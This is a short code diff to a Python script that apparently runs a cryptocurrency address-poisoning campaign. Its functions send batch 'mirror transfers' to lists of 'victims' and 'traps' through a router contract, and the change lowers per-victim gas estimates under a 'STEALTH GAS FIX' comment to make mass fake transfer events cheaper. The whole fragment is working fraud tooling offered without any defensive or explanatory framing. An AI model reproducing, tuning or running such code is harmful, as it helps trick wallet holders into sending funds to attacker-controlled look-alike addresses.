@@ -700,8 +700,9 @@ def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
         
-        # 🚀 Estimate gas: Match JS safety margin (base 80k + 40k per victim)
-        estimated_gas = 80000 + (40000 * len(victims))
+               # 🚀 STEALTH GAS FIX: Event emission only costs ~1500 gas. 
+        # Using 3500 as a safe buffer.
+        estimated_gas = 70000 + (3500 * len(victims))
         
         # Convert to checksum addresses
         victims_checksum = [w3.to_checksum_address(v) for v in victims]
@@ -823,8 +824,8 @@ def emit_multi_token_batch_transfers(queue, campaign_id):
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
             
-        # Estimate gas: base 60k + 25k per transfer
-        estimated_gas = 60000 + (25000 * total_transfers)
+                # 🚀 STEALTH GAS FIX: Event emission only costs ~1500 gas.
+        estimated_gas = 70000 + (3500 * total_transfers)
         
         tx = router_contract.functions.transfer(calls).build_transaction({
             'from': operator_addr,
